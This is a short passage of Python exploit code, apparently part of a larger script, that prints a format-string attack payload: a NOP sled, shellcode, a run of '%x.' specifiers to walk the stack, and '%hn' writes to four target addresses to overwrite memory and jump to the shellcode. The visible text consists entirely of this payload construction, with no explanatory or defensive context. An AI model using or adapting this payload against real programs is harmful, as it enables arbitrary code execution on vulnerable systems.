...
with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
    stdout.write(NOPSLED + SHELLCODE + b'%x.'*285 + b'%' + ADDRESSOFSHELL1 + b'x' b'%hn' + b'%' + b'x'  + b'%hn' + b'%hn' + b'%hn' + ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + ADDRESSTOWRITE3 + ADDRESSTOWRITE4 + b'\n')
